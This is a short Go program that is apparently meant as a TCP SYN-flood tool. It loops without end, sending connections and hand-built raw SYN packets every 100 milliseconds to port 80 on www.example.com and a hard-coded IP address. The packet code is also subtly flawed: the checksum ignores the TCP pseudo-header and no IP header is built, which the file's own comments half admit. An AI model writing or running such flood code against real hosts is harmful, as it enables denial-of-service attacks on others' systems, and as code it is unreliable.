package main

import (
	"fmt"
	"net"
	"syscall"
	"time"
)

func main() {
	target := "www.example.com"
	port := 80

	for {
		go sendSYN(target, port)
		time.Sleep(100 * time.Millisecond)
	}
}

func sendSYN(target string, port int) {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	defer conn.Close()

	// Manually crafting a TCP SYN packet
	rawSocket, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		fmt.Println("Error creating raw socket:", err)
		return
	}
	defer syscall.Close(rawSocket)

	// Constructing the TCP header
	// (Note: This is a simplified example and may not work in all scenarios)
	synPacket := []byte{
		// Source Port (random)
		0x12, 0x34,
		// Destination Port (HTTP)
		0x00, 0x50,
		// Sequence Number (random)
		0x44, 0x33, 0x22, 0x11,
		// Acknowledgment Number (not set in SYN packet)
		0x00, 0x00, 0x00, 0x00,
		// Data Offset and Reserved bits
		0x50,
		// Flags (SYN)
		0x02,
		// Window Size
		0xFF, 0xFF,
		// Checksum (needs to be calculated)
		0x00, 0x00,
		// Urgent Pointer
		0x00, 0x00,
		// Options and Padding (if any)
	}

	// Calculating the TCP checksum
	checksum := calculateChecksum(synPacket)
	synPacket[16] = byte(checksum >> 8)
	synPacket[17] = byte(checksum)

	// Sending the crafted SYN packet
	syscall.Sendto(rawSocket, synPacket, 0, &syscall.SockaddrInet4{
		Port: port,
		Addr: [4]byte{93, 184, 216, 34}, // Example IP address
	})
}

func calculateChecksum(packet []byte) uint16 {
	// Simplified checksum calculation, actual implementation may vary
	var sum uint32
	for i := 0; i < len(packet); i += 2 {
		sum += uint32(packet[i])<<8 + uint32(packet[i+1])
	}
	for sum > 0xFFFF {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return uint16(^sum)
}
